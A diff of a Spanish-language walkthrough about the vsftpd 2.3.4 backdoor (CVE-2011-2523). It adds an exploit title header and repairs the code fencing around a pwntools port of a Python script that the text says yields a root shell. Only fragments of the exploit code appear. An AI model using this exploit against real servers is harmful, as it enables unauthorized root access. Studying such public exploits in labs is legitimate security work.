@@ -57,7 +57,12 @@ Al ejecutar el script obtendremos automaticamente una shell como usuario root en
 
 Podemos modificar el script para reemplazar telnet por pwntools, así el script funcionará con las versiones actuales de python 
 
-`python
+# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution (pwntools)  
+**CVE:** CVE-2011-2523  
+**Original author:** HerculesRD  
+**Ported to pwntools for Python 3.13+**
+
+```python
 from pwn import *
 import argparse
 from signal import signal, SIGINT
@@ -94,7 +99,7 @@ try:
     shell.interactive()
     shell.close()
 except Exception as e:
-    print(f"[!] Error: {e}")`
+    print(f"[!] Error: {e}")
 
 
 
